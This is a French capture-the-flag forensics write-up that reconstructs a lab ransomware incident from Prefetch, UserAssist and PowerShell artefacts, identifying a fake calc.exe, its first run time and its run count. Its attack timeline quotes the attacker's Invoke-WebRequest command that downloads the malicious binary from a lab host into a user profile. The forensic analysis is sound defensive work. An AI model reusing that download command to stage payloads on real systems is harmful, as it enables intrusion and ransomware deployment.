---
title: "Janus · Final Trigger"
platform: "HackerLab Benin 2026 (H4ckd4ne)"
category: "forensics"
difficulty: "—"
points: 0
os: "—"
date: 2026-11-20
author: "H4ckd4ne"
author_github: "H4ckd4ne"
source: "https://github.com/H4ckd4ne/hackerlab2026-writeups/blob/main/janus/final-trigger/writeup-final-trigger.md"
license: "CC BY-SA 4.0"
status: published
---

# Write-up — Mission 7 : Final Trigger

## Contexte

Une fois l'accès obtenu, l'attaquant a exécuté un binaire de chiffrement déguisé en programme légitime. Objectif : identifier le déclencheur, l'heure de première exécution et le nombre total de lancements.

## Artefacts exploités

| Artefact | Chemin | Apport |
|---|---|---|
| Prefetch | `C:\Windows\Prefetch\CALC.EXE-4E7435FB.pf` | chemin source, run count, horodatages |
| Prefetch (comparaison) | `CALC.EXE-43F37294.pf` | calculatrice légitime (System32 / WindowsApps) |
| UserAssist | `C:\Users\backup\NTUSER.DAT` | corroboration du nombre d'exécutions |
| Historique PowerShell | transcript de backup | téléchargement du binaire |
| Timeline système | création des `.enc` | moment du déclenchement réel |

## Méthodologie

1. Extraction de l'arbre KAPE, puis déchiffrement des artefacts (fichiers `.enc`) avec la clé récupérée par rétro-ingénierie du ransomware.
2. Parsing des Prefetch avec `pyscca` : chemin de l'exécutable référencé, `run_count`, `last_run_time(i)`.
3. Parsing de UserAssist (clé `Explorer\UserAssist`, noms ROT13, structure binaire : compteur d'exécutions + FILETIME).
4. Comparaison des deux entrées Prefetch `CALC.EXE` pour écarter la calculatrice Windows légitime.
5. Corrélation temporelle avec le début du chiffrement.

## Résultats

Deux prefetch `CALC.EXE` distincts (hash de chemin différent) :

- `CALC-43F37294.pf` → `C:\Windows\System32\calc.exe` + paquets `Microsoft.WindowsCalculator` : activité normale.
- `CALC-4E7435FB.pf` → `C:\Users\backup\calc.exe` : binaire déposé par l'attaquant.

Sur l'entrée malveillante :

- Run count : **3**
- Dernières exécutions (UTC) : **18:58:17.520868**, **19:23:47.333772**, **19:26:34.262787**

UserAssist confirme indépendamment :

- `C:\Users\backup\calc.exe` → **3 exécutions**, dernière à **19:26:34.246 UTC**
- `Microsoft.WindowsCalculator_8wekyb3d8bbwe!App` → 8 exécutions, dernière à 17:19:47 UTC (activité antérieure, sans lien)

## Chaîne d'attaque reconstituée

- **18:54:04 UTC** — téléchargement : `Invoke-WebRequest http://192.168.230.130:8900/calc.exe -OutFile C:\Users\backup\calc.exe`
- **18:58:17 UTC** — première exécution
- **18:59:35 UTC** — création du premier fichier chiffré (`verdicts_dump.sql.enc`), soit ~1 minute après le lancement → cohérent avec un chiffrement asynchrone lancé par le binaire.

## Conclusion

- Déclencheur : **calc.exe** (faux binaire dans le profil `backup`, pas la calculatrice système)
- Première exécution : **18:58:17 UTC** → **19:58:17 en heure locale** (UTC+1, cohérent avec le fuseau des logs Apache)
- Nombre total d'exécutions : **3**

Deux sources indépendantes (Prefetch + UserAssist) concordent, et l'horodatage est corroboré par l'apparition des fichiers `.enc`.
